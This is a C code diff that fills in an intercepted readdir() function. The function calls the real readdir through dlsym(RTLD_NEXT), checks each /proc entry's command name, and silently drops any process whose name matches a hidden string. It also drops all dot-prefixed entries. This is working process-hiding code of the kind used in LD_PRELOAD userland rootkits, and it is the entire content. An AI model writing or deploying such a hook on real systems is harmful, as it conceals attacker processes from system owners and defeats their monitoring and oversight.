@@ -16,5 +16,24 @@ static const char *hide_name(void) {
 }
 
 struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *ent;
+    while ((ent = orig(dirp)) != NULL) {
+        if (ent->d_name[0] == '.' ) continue;
+        char path[256];
+        snprintf(path, sizeof(path), "/proc/%s/comm", ent->d_name);
+        FILE *f = fopen(path, "r");
+        if (!f) return ent;
+        char comm[64] = {0};
+        if (fgets(comm, sizeof(comm), f)) {
+            comm[strcspn(comm, "\n")] = 0;
+            if (strstr(comm, hide_name()) != NULL) {
+                fclose(f);
+                continue;
+            }
+        }
+        fclose(f);
+        return ent;
+    }
     return NULL;
 }
